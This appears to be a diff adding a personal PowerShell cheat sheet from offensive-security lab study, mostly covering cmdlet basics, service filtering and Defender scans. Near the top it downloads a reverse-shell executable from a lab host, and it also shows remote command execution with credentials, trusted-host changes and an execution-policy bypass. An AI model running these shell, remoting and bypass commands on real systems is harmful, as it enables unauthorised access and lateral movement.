@@ -1,0 +1,32 @@
+echo $PSVersionTable
+Invoke-WebRequest -Uri http://192.168.48.2/windows_reverse.exe -OutFile windows_reverse.exe         //Downloading Shell
+
+Enable-PSRemoting                                                                                   //Remoting with Powershell
+Invoke-Command -ComputerName 192.168.50.80 -Scriptblock { ipconfig } -Credential offensive          //Remoting with Powershell
+Set-Item wsman:\localhost\client\trustedhosts 192.168.50.80                                         //Remoting with Powershell
+
+Expand-Archive -Path .\PSTools.zip -DestinationPath C:\Windows\System32\			    //Extraction in PowerShell
+Get-ADGroupMember ThirdGroup -recursive								    // Displaying John as nested member of ThirdGroup
+
+Get-Verb
+Get-Help Get-Help
+Get-Alias
+Get-Command -Noun file										    // Filtered list of commands
+Get-Command -Verb out,edit,export -Noun *file*
+
+Get-Service | Get-Member
+Get-Service | Select-Object -Property "DisplayName","MachineName","ServiceType","StartType","Status"
+Get-Service | Select-Object -Property DisplayName,ServiceType,StartType,Status | Sort-Object -Property Status -Descending
+Get-Service | Select-Object -Property DisplayName,ServiceType,StartType,Status | Sort-Object -Property Status -Descending | Where-Object StartType -EQ Automatic
+Get-Service | Select-Object -Property DisplayName,ServiceType,StartType,Status | Sort-Object -Property Status -Descending | Where-Object StartType -EQ Automatic | Format-List
+Get-Service | Select-Object -Property ServiceName,DisplayName,ServiceType,StartType,Status | Sort-Object -Property Status -Descending | Where-Object {$_.StartType -EQ "Automatic" -And $_.ServiceName -Match "^s"}
+Get-Service | Select-Object -Property ServiceName,DisplayName,ServiceType,StartType,Status | Sort-Object -Property Status -Descending | Where-Object {$_.StartType -EQ "Automatic" -And $_.ServiceName -Match "^s"} | Format-Table
+
+powershell.exe -exec bypass C:\Users\vandelay\Desktop\computerInfo.ps1
+Get-Module -ListAvailable
+Get-Command -Module Defender
+Get-Help Start-MpScan
+Start-MpScan -ScanPath 'C:\\Users\\User\\' -ScanType QuickScan
+
+
+
